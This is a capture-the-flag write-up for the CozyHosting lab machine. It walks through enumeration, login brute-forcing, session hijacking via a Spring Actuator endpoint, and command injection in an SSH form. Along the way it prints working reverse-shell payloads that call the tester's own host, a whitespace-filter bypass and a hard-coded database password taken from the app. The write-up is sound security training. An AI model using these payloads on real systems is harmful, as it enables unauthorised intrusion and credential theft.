## Description
CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user's session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application's `JAR` file, hard-coded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges. 
## Information gathering
Let's start by discovering the services running on the machine:
```
$nmap -p- -oN nmap 10.129.103.86
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-28 21:48 CEST
Nmap scan report for 10.129.103.86
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
We have a web server and an SSH server, let's look which server is running on which version:
```
$nmap -sC -sV -p22,80 -oN nmap_version 10.129.103.86
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-28 21:51 CEST
Nmap scan report for 10.129.103.86
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds
```
The SSH server is OpenSSH 8.9p1 and the web server is nginx 1.18.0. It tried to redirect to `cozyhosting.htb`, that means that we would have to update our `/etc/hosts` file to redirect the domain name `cozyhosting.htb` to the IP address of the server:
```
#echo "10.129.103.86 cozyhosting.htb" >> /etc/hosts
```
This is the website of Cozy Hosting, a company that offers "modern solutions for growing your business". Let's look at the home page in details. Using `Wappalyzer`, we can see that the site is running under nginx 1.18.0 on Ubuntu (nothing new here) and uses AOS and `Swiper` JavaScript libraries. In the comment, we can see that `FlexStart`, a Bootstrap template, has been used, and this template has been updated with the version 5.2.3 of Bootstrap.
On the site, the home page is totally static, but there is a login page accessible from a button at the top right of the page. On the login page, the template that has been used is `NiceAdmin`. The login page has two fields (Username and Password and a "Remember me" feature).
We can now enumerate the potential hidden directories using gobuster:
```
$gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/28 22:06:21 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431] 
/logout               (Status: 204) [Size: 0]    
                                                 
===============================================================
2023/09/28 22:06:48 Finished
===============================================================
```
There is an admin page that redirect to the login page. This also sets a cookie with a `JSESSIONID`. There is an error page that indicates that there is no mapping for `/error` and add the following error message: `There was an unexpected error (type=None, status=999).`. A quick search on Google about this error tells us this comes from a Spring application. We have already taken a look at the index and login pages. The logout page redirects to the login page.
I also tried to get the admin page using curl:
```
$curl http://cozyhosting.htb/admin -v
*   Trying 10.129.74.219:80...
* Connected to cozyhosting.htb (10.129.74.219) port 80 (#0)
> GET /admin HTTP/1.1
> Host: cozyhosting.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 401 
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 21 Oct 2023 15:40:55 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: JSESSIONID=449F7D6C8735F1391CBEEC21B7FB5E57; Path=/; HttpOnly
< WWW-Authenticate: Basic realm="Realm"
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 0
< Cache-Control: no-cache, no-store, max-age=0, must-revalidate
< Pragma: no-cache
< Expires: 0
< X-Frame-Options: DENY
< 
* Connection #0 to host cozyhosting.htb left intact
{"timestamp":"2023-10-21T15:40:55.424+00:00","status":401,"error":"Unauthorized","path":"/admin"}
```
We do not have a redirection to the login page, but we can see there is a Basic auth and 401 error if the credentials are not correct.

Let's search for other virtual hosts:
```
$gobuster vhost -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cozyhosting.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/09/28 22:09:33 Starting gobuster in VHOST enumeration mode
===============================================================
                              
===============================================================
2023/09/28 22:09:43 Finished
===============================================================
```
Apparently, there is no other virtual hosts for this domain. But I did a more in-depth analysis because this is a hosting service, so it is possible to have subdomains. I tried with a more complete wordlists:
```
$ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://cozyhosting.htb/ -H 'Host: FUZZ.cozyhosting.htb' -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cozyhosting.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1415 req/sec :: Duration: [0:01:31] :: Errors: 0 ::
```
And with a list of usernames because it makes sense to use the username in the subdomain:
```
$ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://cozyhosting.htb/ -H 'Host: FUZZ.cozyhosting.htb' -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Host: FUZZ.cozyhosting.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

:: Progress: [8295455/8295455] :: Job [1/1] :: 1352 req/sec :: Duration: [2:26:07] :: Errors: 58 ::
```

Let's focus on the login page which seems the most promising attack vector. When you try to log in using random credentials, you get an error "Invalid username or password". JavaScript avoids you to send a request without a login nor a password. Using OWASP ZAP, I tried to send the login request without a password or a login, but I got the same error message.

I finally run a nmap analysis to get UDP open ports:
```
$sudo nmap -sU -oN nmap_udp 10.129.176.167
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 13:52 CEST
Nmap scan report for 10.129.176.167
Host is up (0.021s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```
We have a DHCP client open at port 68.
## Vulnerability assessment
### OpenSSH
OpenSSH 8.9p1 is running on Ubuntu. There is a vulnerability ([CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)) which seems quite complex to exploit and requires interaction with a connected user.
### Nginx
Let's first use the vulnerability scripts of nmap to check the potential vulnerabilities of the HTTP server:
```
$nmap --script vuln -p80 -oN nmap_http_vuln 10.129.176.167
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 14:09 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for cozyhosting.htb (10.129.176.167)
Host is up (0.020s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=cozyhosting.htb
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://cozyhosting.htb:80/login
|     Form id: inputgroupprepend
|_    Form action: /login
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   //system.html: CMNC-200 IP Camera
|   /Citrix//AccessPlatform/auth/clientscripts/cookies.js: Citrix
|   /.nsf/../winnt/win.ini: Lotus Domino
|   /uir//etc/passwd: Possible D-Link router directory traversal vulnerability (CVE-2018-10822)
|_  /uir//tmp/csman/0: Possible D-Link router plaintext password file exposure (CVE-2018-10824)
```
There is indeed a CSRF vulnerability, but I do not see how to exploit it here. The `http-enum` vulnerabilities found are not related to the website `cozyhosting.htb` and seems to be false positives to me.

I also run searchsploit to find any known vulnerabilities, but none seems to correspond to this version:
```
$searchsploit nginx
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation                                                                              | linux/local/40768.sh
Nginx 0.6.36 - Directory Traversal                                                                                                                          | multiple/remote/12804.txt
Nginx 0.6.38 - Heap Corruption                                                                                                                              | linux/local/14830.py
Nginx 0.6.x - Arbitrary Code Execution NullByte Injection                                                                                                   | multiple/webapps/24967.txt
Nginx 0.7.0 < 0.7.61 / 0.6.0 < 0.6.38 / 0.5.0 < 0.5.37 / 0.4.0 < 0.4.14 - Denial of Service (PoC)                                                           | linux/dos/9901.txt
Nginx 0.7.61 - WebDAV Directory Traversal                                                                                                                   | multiple/remote/9829.txt
Nginx 0.7.64 - Terminal Escape Sequence in Logs Command Injection                                                                                           | multiple/remote/33490.txt
Nginx 0.7.65/0.8.39 (dev) - Source Disclosure / Download                                                                                                    | windows/remote/13822.txt
Nginx 0.8.36 - Source Disclosure / Denial of Service                                                                                                        | windows/remote/13818.txt
Nginx 1.1.17 - URI Processing SecURIty Bypass                                                                                                               | multiple/remote/38846.txt
Nginx 1.20.0 - Denial of Service (DOS)                                                                                                                      | multiple/remote/50973.py
Nginx 1.3.9 < 1.4.0 - Chuncked Encoding Stack Buffer Overflow (Metasploit)                                                                                  | linux/remote/25775.rb
Nginx 1.3.9 < 1.4.0 - Denial of Service (PoC)                                                                                                               | linux/dos/25499.py
Nginx 1.3.9/1.4.0 (x86) - Brute Force                                                                                                                       | linux_x86/remote/26737.pl
Nginx 1.4.0 (Generic Linux x64) - Remote Overflow                                                                                                           | linux_x86-64/remote/32277.txt
PHP-FPM + Nginx - Remote Code Execution                                                                                                                     | php/webapps/47553.md
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We will now look at the login page in more details and use [login bypass techniques](https://book.hacktricks.xyz/pentesting-web/login-bypass) to identify a potential vulnerability:
 - Is there any comments in the page giving usernames or passwords? No.
 - Is it possible to access directly to the restricted pages? No. I tried to access to `/admin`, and it redirects me to the login page.
 - Is it possible to send 0 or 1 parameters only? No. I already tried in the previous section and I got redirected to the login page with an error.
 - Is it possible to raise a PHP comparison error by using HTTP parameter array types? No. No error appears after setting `username` and `password` as array types.
 - Is it possible to send JSON data? No. I get the same redirection to the login page with an error.
 - Is it possible to raise a NodeJS parsing error? No, same redirection with same error.
 - Can we use default credentials? No particular technology seems to be used.
 - Does common combinations of login/password works? I used the fuzzer of OWASP ZAP and used a list of the 100 first usernames of `xato-net-10-million-usernames.txt` and the 100 passwords from `xato-net-10-million-passwords-100.txt`. I added also some usernames and passwords related to the website and the technology (`nginx`, `cozyhosting` with different wordings...). I also tried to add `@cozyhosting.htb` at the end of the username because the login page shows an `@` sign which may show that usernames are email addresses.
 - Does sniffing the website provides valid credentials? I run `cewl` to get a list of words that I now use as potential login or passwords in the fuzzer of OWASP ZAP.
 - Can a more in-depth bruteforce provides valid credentials? I used `ffuf`:
 ```
 $ ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USERNAME -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSWORD -u http://cozyhosting.htb/login -X POST -d "username=USERNAME&password=PASSWORD" -H 'Content-Type: application/x-www-form-urlencoded' -fr "Invalid username or password" -ic  -r
 ```
 The website seems long to respond (around 8 requests per seconds) so bruteforce may not be the most promising attack vector. I run this command during 20 minutes with no results.
 - Is it vulnerable to SQL injection? No, I used a [list](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass) of malicious usernames or passwords. And I always get a 302 HTTP code with the same response headers.
 - Is it vulnerable to NoSQL injection? No, I tried to use some lists of NoSQL Injection payloads, but I always get the same results.
 - Is it vulnerable to XPath injection? No, I also used a list of payloads that I used in OWASP ZAP and all the answers are the same.
 - Is it vulnerable to LDAP injection? No, using the same method as above.
 - Is the "Remember Me" feature exploitable? No, it just adds a "remember" POST parameter taking a boolean value (true or false). Changing it does not seem to change anything.
 - Is there an exploitable open redirection? No. When you try to go to the admin page, you are redirected to the login page and no parameter stores information about where to redirect.
 - Is it possible to enumerate usernames? No. The error message when the login fails does not mention if the username or the password is wrong and there is no "Forgot password" feature.
 However, by reading carefully the home page of the site, there is an email address: `info@cozyhosting.htb`. It is possible that `info` or `info@cozyhosting.htb` to be a valid username. It would be interesting to bruteforce using these values. I put both in a file and run a `ffuf` command:
 ```
 $ffuf -w usernames:USERNAME -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSWORD -u http://cozyhosting.htb/login -X POST -d "username=USERNAME&password=PASSWORD" -H 'Content-Type: application/x-www-form-urlencoded' -fr "Invalid username or password" -ic  -r
 ```
 Because `ffuf` does not URL encode, I wrote `info%40cozyhosting.htb` in the `usernames` file. But I got no positive results.
 Using OWASP ZAP, I also tried to find an injection vulnerability using these usernames but with no results.
 - Is there an auto-complete feature? No.

I also tried some of these cases on the `/admin` page using Basic authentication with no success. I always get a 401 error with the same message:
```
{"timestamp":"2023-10-21T16:03:58.529+00:00","status":401,"error":"Unauthorized","path":"/admin"}
```

I also noticed that, after a login failed, you are redirected to `http://cozyhosting.htb/login?error`. The parameter `error` is used to get the error message under the login form. I tried to fuzz this GET parameter with `/usr/share/wordlists/dirb/common.txt` to see if another word could do something else but only `error` adds information to the page. Then, I tried with the word list `/usr/share/seclists/Miscellaneous/lang-english.txt`. No more results.
### `dhcpc`
To be honest, I do not really know what to do with this service. I do not find so much information on what vulnerabilities I could find for it, so I will pass.
### Spring
There is a [page on Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) related to Spring Actuators. An actuator provides predefined features to an application and can be discovered through the endpoint `/actuator`. We can see that some of them are available on the server:
```
{
  "_links": {
    "self": {
      "href": "http://localhost:8080/actuator",
      "templated": false
    },
    "sessions": {
      "href": "http://localhost:8080/actuator/sessions",
      "templated": false
    },
    "beans": {
      "href": "http://localhost:8080/actuator/beans",
      "templated": false
    },
    "health": {
      "href": "http://localhost:8080/actuator/health",
      "templated": false
    },
    "health-path": {
      "href": "http://localhost:8080/actuator/health/{*path}",
      "templated": true
    },
    "env": {
      "href": "http://localhost:8080/actuator/env",
      "templated": false
    },
    "env-toMatch": {
      "href": "http://localhost:8080/actuator/env/{toMatch}",
      "templated": true
    },
    "mappings": {
      "href": "http://localhost:8080/actuator/mappings",
      "templated": false
    }
  }
}
```
The `/sessions` endpoint tells us there is a session named `kanderson` with that looks like to a session ID. After modifying the current `JSESSIONID` in Firefox by this one, I am now able to access to the admin page.
In the admin page, you have a list of the recent sales, the number of running applications, and a form to add a host to automatic patching. Also, you have a warning saying that 3 hosts require attention.
The form does a POST request to the endpoint `/executessh` with two parameters: `host` and `username`. Above the form, there is a message saying: "For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorized_keys file." We can suppose the website execute an SSH query for the specified user.
If we send `cozyhosting.htb` with the username `kanderson`, an error is raised: "Host key verification failed." It seems to mean that the user `kanderson` does not have the private key. We can check the host name is correct by sending a request with a bad hostname. In that case, you get the error: "ssh: Could not resolve hostname dsqqdsd: Temporary failure in name resolution". This is the error message provided by ssh. We can suppose this form is vulnerable to command injection. Meanwhile, we can try to bruteforce the username with:
```
$ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt:USERNAME -u http://cozyhosting.htb/executessh -X POST -d "host=cozyhosting.htb&username=USERNAME" -H 'Content-Type: application/x-www-form-urlencoded' -fr "Host key verification failed" -ic -r
```
Indeed, it seems that this endpoint does not require authentication. However, I got no results.
### Command injection
It appears that the data sent through the form `/executessh` is directly used in a command. Let's create a curl command that will send this form and, then, we will tweak it to find any potential vulnerabilities:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host cozyhosting.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.88
*   Trying 10.129.229.88:80...
* Connected to cozyhosting.htb (10.129.229.88) port 80
> POST /executessh HTTP/1.1
> Host: cozyhosting.htb
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 39
> 
< HTTP/1.1 302 
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 16 Mar 2024 16:42:00 GMT
< Content-Length: 0
< Location: http://cozyhosting.htb/admin?error=Host key verification failed.
< Connection: keep-alive
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 0
< Cache-Control: no-cache, no-store, max-age=0, must-revalidate
< Pragma: no-cache
< Expires: 0
< X-Frame-Options: DENY
< 
* Connection #0 to host cozyhosting.htb left intact
```
I used to `-v` option to see the request and the response. In the response, we can see the error that is returned to the `Location` header: "Host key verification failed". To find a command injection, I will try to add a `;` in one of the fields to check what happens. Indeed, `;` is the command separator for shell commands. Let's see what happens for the `host` parameter:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb;&username=kanderson' -v 2> >( grep Location )
< Location: http://cozyhosting.htb/admin?error=Invalid hostname!
```
The error is now "Invalid hostname". It seems there is a kind of validation of the `host` parameter. Let's look at the `username` parameter:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;' -v 2> >( grep Location )
< Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: @cozyhosting.htb: command not found
```
This time, we got an ssh error and a bash error. It seems that ssh try to connect to `kanderson` which is the username, and try to run the bash command `@cozyhosting.htb` which is the hostname preceded by an `@`. We can suppose that the command that is executed has the following format: `ssh <username>@<hostname>`. To check that, let's try to craft the command `ssh kanderson;id;@cozyhosting.htb` in order to get the command `id` executed:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;id;' -v 2> >( grep Location )
< Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: @cozyhosting.htb: command not found
```
Unfortunately, the result is the same as before. Does that mean that the command has not been executed? Let's try to run a reverse shell to check that. On my host, I will run `nc -lvnp 4444` and I will send the command of a reverse shell: `sh -i >& /dev/tcp/10.10.14.109/4444 0>&1`. Before that, I should take care that the string is URL encoded, because it contains `&` that should not be confused with the ones separating the HTTP parameters:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;sh -i >%26 /dev/tcp/10.10.14.109/4444 0>%261;' -v 2> >( grep Location )
< Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!
```
Unfortunately, it seems there is a verification of the `username` parameter. It should not contain whitespace. It is not an issue because we can write shell commands without spaces by replacing them by `${IFS}`. Let's try again:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;sh${IFS}-i${IFS}>%26${IFS}/dev/tcp/10.10.14.109/4444${IFS}0>%261;' -v  2> >( grep Location )
< Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: ${IFS}/dev/tcp/10.10.14.109/4444${IFS}0: ambiguous redirect/bin/bash: line 1: @cozyhosting.htb: command not found
```
This time, we have an error from the bash: "/bin/bash: line 1: ${IFS}/dev/tcp/10.10.14.109/4444${IFS}0: ambiguous redirect". It seems that the redirection is not correctly understood by bash because of the `${IFS}`. Let's try another reverse shell that does not contain any redirection, like `busybox nc 10.10.14.109 4444 -e sh`:
```
$curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;busybox${IFS}nc${IFS}10.10.14.109${IFS}4444${IFS}-e${IFS}sh;' -v  2> >( grep Location )
```
This time, it works! I have my reverse shell:
```
$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.229.88] 42282
id
uid=1001(app) gid=1001(app) groups=1001(app)
hostname
cozyhosting
```
I can start to look for the flag after setting a better shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
## Target machine enumeration
First, let's look at the flag which is generally located in the home folder of one of the users of the machine:
```
app@cozyhosting:/app$ ls -l /home
ls -l /home
total 4
drwxr-x--- 3 josh josh 4096 Aug  8  2023 josh
app@cozyhosting:/app$ ls -l /home/josh
ls -l /home/josh
ls: cannot open directory '/home/josh': Permission denied
```
There is a user named `josh`, but we do not have the permissions to read inside his home folder.

The user `josh` is running no processes:
```
ps aux | grep josh
app         1850  0.0  0.0   6476  2220 pts/0    S+   17:58   0:00 grep josh
```
Indeed, it seems that this user is not logged:
```
ps au | cut -d' ' -f1 | sort | uniq
app
root
USER
```

I am not able to get the list of the sudo privileges of the user `app` because the command `sudo -l` requires a password:
```
app@cozyhosting:/app$ sudo -l
sudo -l
[sudo] password for app: 

Sorry, try again.
[sudo] password for app: app

Sorry, try again.
[sudo] password for app: kanderson

sudo: 3 incorrect password attempts
```

We can look at the list of the users by looking into the file `/etc/passwd`:
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```
We can see that the `app` user seems to have a home, but it seems to not exist:
```
ls /home/app
ls: cannot access '/home/app': No such file or directory
```

But there is the jar file of the application available in `/app`. Let's unzip it and look for interesting stuff:
```
app@cozyhosting:/tmp/jar$ unzip /app/cloudhosting-0.0.1.jar
unzip /app/cloudhosting-0.0.1.jar
Archive:  /app/cloudhosting-0.0.1.jar
[...]
app@cozyhosting:/tmp/jar$ grep -ri password
grep -ri password
grep: BOOT-INF/lib/spring-security-config-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-web-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/thymeleaf-spring6-3.1.1.RELEASE.jar: binary file matches
grep: BOOT-INF/lib/tomcat-embed-core-10.1.5.jar: binary file matches
grep: BOOT-INF/lib/postgresql-42.5.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-core-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-webmvc-6.0.4.jar: binary file matches
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
BOOT-INF/classes/templates/login.html:                                        <label for="yourPassword" class="form-label">Password</label>
BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
```
It seems there is a password in the file `BOOT-INF/classes/application.properties`:
```
app@cozyhosting:/tmp/jar$ cat BOOT-INF/classes/application.properties
cat BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
This is the password of the `postgres` user. We can now log into the database:
```
app@cozyhosting:/tmp/jar$ /usr/lib/postgresql/14/bin/psql -U postgres -d cozyhosting -W -h 127.0.0.1
<bin/psql -U postgres -d cozyhosting -W -h 127.0.0.1
Password: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
